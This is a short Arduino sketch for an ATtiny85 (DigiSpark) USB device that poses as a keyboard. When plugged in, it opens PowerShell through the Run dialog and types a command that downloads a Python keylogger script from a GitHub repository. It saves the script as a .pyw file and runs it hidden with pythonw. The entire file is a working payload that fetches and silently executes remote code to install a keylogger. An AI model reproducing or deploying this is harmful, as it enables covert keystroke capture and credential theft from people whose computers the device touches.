#include "DigiKeyboard.h"

void setup() {

    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    delay(500);
    DigiKeyboard.print("powershell");
    delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    delay(500);
    DigiKeyboard.print("Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/Pranav-V-20/Remote_Keylogger_Using_Attiny85/refs/heads/main/keylogger.py\" | select -ExpandProperty Content | Out-File -append -encoding utf8 keylogger.pyw");
    delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    delay(1000);
    DigiKeyboard.print("pythonw keylogger.pyw");
    delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
;}

void loop() {
    
}